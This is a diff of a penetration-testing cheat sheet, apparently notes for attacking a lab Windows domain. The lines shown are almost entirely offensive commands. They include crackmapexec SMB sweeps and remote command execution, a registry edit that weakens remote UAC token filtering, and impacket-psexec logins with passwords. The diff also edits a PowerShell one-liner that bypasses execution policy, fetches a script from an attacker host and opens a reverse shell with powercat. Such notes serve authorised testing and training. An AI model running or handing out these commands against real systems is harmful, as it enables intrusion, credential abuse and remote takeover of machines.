@@ -184,7 +184,7 @@ crackmapexec smb 192.168.100.0/24
 ```
 
 #### Enumerate
-# Start
+#Start
 ```Shell
 cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 crackmapexec smb 192.168.100.19 -u root -p <pwd> --local-auth -x whoami 
@@ -192,7 +192,7 @@ impacket-psexec yuncorp.local/Administrator:P@\$\$w0rd\!@192.168.100.19 cmd.exe
 impacket-psexec workgroup/root:pwd@192.168.100.19 cmd.exe
 ```
 ```Shell
-powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.17 -Port 443"
+powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"
 ```
 
 ```Shell
